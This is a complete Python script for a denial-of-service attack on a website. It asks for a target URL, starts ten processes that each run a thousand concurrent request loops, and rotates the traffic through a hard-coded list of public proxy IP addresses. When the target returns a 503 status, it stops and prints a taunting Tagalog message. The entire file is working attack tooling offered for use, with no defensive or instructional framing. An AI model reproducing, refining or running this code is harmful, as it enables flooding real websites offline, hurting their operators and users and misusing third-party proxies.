import aiohttp
import asyncio
import multiprocessing
from itertools import cycle

website_down = False

# List of free public proxies
proxies = [
    'http://51.158.68.26:8811',
    'http://194.67.37.90:3128',
    'http://118.27.113.167:8080',
    'http://103.111.137.226:8085',
    'http://128.199.214.87:3128',
    'http://89.36.212.224:3128',
    'http://103.216.82.213:6666',
    'http://103.216.82.213:6667',
    'http://103.216.82.213:6668',
    'http://103.216.82.213:6669',
]

proxy_pool = cycle(proxies)

async def attack(target_url):
    global website_down
    proxy = next(proxy_pool)
    try:
        async with aiohttp.ClientSession() as session:
            while not website_down:
                try:
                    async with session.get(target_url, proxy=proxy) as response:
                        print(f"Status Code: {response.status} using proxy {proxy}")
                        if response.status == 503:  # Service Unavailable
                            print("BAGSAK ANG GAGO HAHAHA 🤣🤣")
                            website_down = True
                except aiohttp.ClientError as e:
                    print(f"Request failed: {e} using proxy {proxy}")
                    proxy = next(proxy_pool)  # Rotate to the next proxy
    except Exception as e:
        print(f"Session error: {e}")

async def main(target_url):
    await asyncio.gather(*[attack(target_url) for _ in range(1000)])  # Increase the number of simultaneous requests

if __name__ == "__main__":
    target_url = input("Enter the URL to attack: ")
    processes = []
    for _ in range(10):  # Increase the number of processes
        process = multiprocessing.Process(target=lambda: asyncio.run(main(target_url)))
        process.start()
        processes.append(process)

    # Wait for all processes to complete
    for process in processes:
        process.join()
                                           
